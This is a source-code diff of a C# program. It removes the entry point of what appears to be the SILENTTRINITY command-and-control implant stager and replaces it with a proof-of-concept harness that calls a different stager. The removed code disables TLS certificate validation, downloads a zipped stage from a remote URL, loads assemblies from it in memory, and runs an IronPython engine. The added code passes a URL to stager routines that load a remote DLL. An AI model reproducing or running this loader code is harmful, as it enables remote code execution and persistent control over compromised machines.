@@ -1,73 +1,31 @@
 ﻿using System;
-using System.IO;
-using System.IO.Compression;
-using System.Reflection;
-using System.Net;
-using System.Runtime.InteropServices;
-using SILENTTRINITY.Utilities;
 
-namespace SILENTTRINITY
+namespace PoC
 {
-    public class ST
+    class Program
     {
-        static ZipStorer Stage;
-
-        static ST()
+        static void Main(string[] args)
         {
-            ServicePointManager.ServerCertificateValidationCallback +=
-                                 (sender, cert, chain, sslPolicyErrors) => true;
-            ServicePointManager.SecurityProtocol = (SecurityProtocolType)768 |
-                                                   (SecurityProtocolType)3072;
-            ServicePointManager.Expect100Continue = false;
-
-            AppDomain.CurrentDomain.AssemblyResolve += ResolveEventHandler;
-        }
-
-        public static void Main(string[] args)
-        {
-            if (args.Length != 1)
+            if (args.Length != 2)
             {
-                Console.WriteLine("[!] Usage: SILENTTRINITY.exe <URL> [<STAGE_URL>]");
+                Console.WriteLine("Usage: PoC.exe <static|assembly> <URL>");
                 Environment.Exit(1);
             }
 
-            Guid GUID = Guid.NewGuid();
-            Uri URL = new Uri(new Uri(args[0]), GUID.ToString());
-#if DEBUG
-            Console.WriteLine("[+] URL: {0}", URL);
-#endif
-            try
-            {
-#if DEBUG
-                Console.WriteLine("[+] Trying to get the stage...");
-#endif
-                Stage = ZipStorer.Open(Internals.DownloadStage(URL), 
-                                       FileAccess.ReadWrite,
-                                       true);
-            }
-            catch
-            {
-#if DEBUG
-                Console.WriteLine("\n\n[!] ERROR: Unable to get the stage.");
-#endif
-                Environment.Exit(-1);
-            }
-#if DEBUG
-            Console.WriteLine("[+] Running the Engine...");
-#endif
-            Engines.IronPython.Run(URL, GUID, Stage); //Magic!!
-        }
+            string test = args[0];
+            string url = args[1];
 
-        static Assembly ResolveEventHandler(object sender, ResolveEventArgs args)
-        {
-            string dllName = Internals.GetDLLName(args.Name);
-
-            byte[] bytes = Internals.GetResourceInZip(Stage, dllName) ??
-                File.ReadAllBytes(RuntimeEnvironment.GetRuntimeDirectory() + dllName);
-#if DEBUG
-            Console.WriteLine("\t[+] '{0}' loaded", dllName);
-#endif
-            return Assembly.Load(bytes);
+            if (test.ToLower().Equals("static"))
+            {
+                // Basic test, just running the static method.
+                Kaliya.Stager.Run(url);
+            } 
+            else if (test.ToLower().Equals("assembly"))
+            {
+                // Another test, the base64 was generated using Out-CompressedDLL
+                // in Debug mode to be able to see the logs
+                DynamicAssembly.Run(url);
+            }
         }
     }
 }
